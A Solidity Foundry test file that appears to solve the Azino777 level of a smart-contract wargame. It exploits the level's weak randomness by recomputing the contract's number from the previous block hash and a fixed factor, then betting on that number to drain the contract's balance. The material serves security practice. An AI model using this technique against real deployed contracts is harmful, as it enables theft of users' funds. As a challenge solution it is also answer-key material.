// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/01_Azino777/Azino777.sol";

// forge test --match-contract Azino777Test -vvvv
contract Azino777Test is BaseTest {
    uint256 constant private FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;
    Azino777 instance;

    function setUp() public override {
        super.setUp();
        instance = new Azino777{value: 0.01 ether}();
        vm.roll(43133);
    }

    function testExploitLevel() public {
        // just calculating rand value to match it
        uint256 factor = (FACTOR * 100) / 100;
        uint256 lastBlockNumber = block.number - 1;
        uint256 hashVal = uint256(blockhash(lastBlockNumber));

        uint256 predictedNum = uint256((uint256(hashVal) / factor)) % 100;
        console.log(predictedNum);

         // Attack the contract by placing a bet on the predicted number
        instance.spin{value: 0.01 ether}(predictedNum);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
